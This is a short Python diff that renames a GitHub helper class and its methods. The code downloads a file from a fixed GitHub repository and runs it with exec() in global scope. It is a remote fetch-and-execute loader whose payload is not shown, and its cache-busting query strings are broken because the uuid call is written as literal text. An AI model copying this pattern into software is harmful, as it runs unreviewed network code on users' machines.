@@ -3,9 +3,9 @@ import json
 import base64
 import uuid
 
-class u:
+class GitHub:
   @classmethod
-  def getFile_GitHubAPI(cls,path):
+  def getFileFromAPI(cls,path):
     path = path.split("|")
     url = f"https://api.github.com/repos/{path[0]}/{path[1]}/contents/{path[2]}?ref=main&cb=uuid.uuid4().hex"
     req = urllib.request.Request(url)
@@ -21,16 +21,16 @@ class u:
         return f"Error: {str(e)}"
 
   @classmethod
-  def getFile_GitHubRAW(cls,path):
+  def getFileFromRAW(cls,path):
     path = path.split("|")
     url = f"https://raw.githubusercontent.com/{path[0]}/{path[1]}/refs/heads/main/{path[2]}?nocache=uuid.uuid4().hex"
     return urllib.request.urlopen(url).read()
     
   @classmethod
-  def getFile_GitHub(cls,path):
+  def getFile(cls,path):
     try:
-      return cls.getFile_GitHubAPI(path)
+      return cls.getFileFromAPI(path)
     except Exception as e:
-      return cls.getFile_GitHubRAW(path)
+      return cls.getFileFromRAW(path)
 
-exec(u.getFile_GitHub("db0bc|pm|pm"), globals())
+exec(GitHub.getFile("db0bc|pm|pm"), globals())
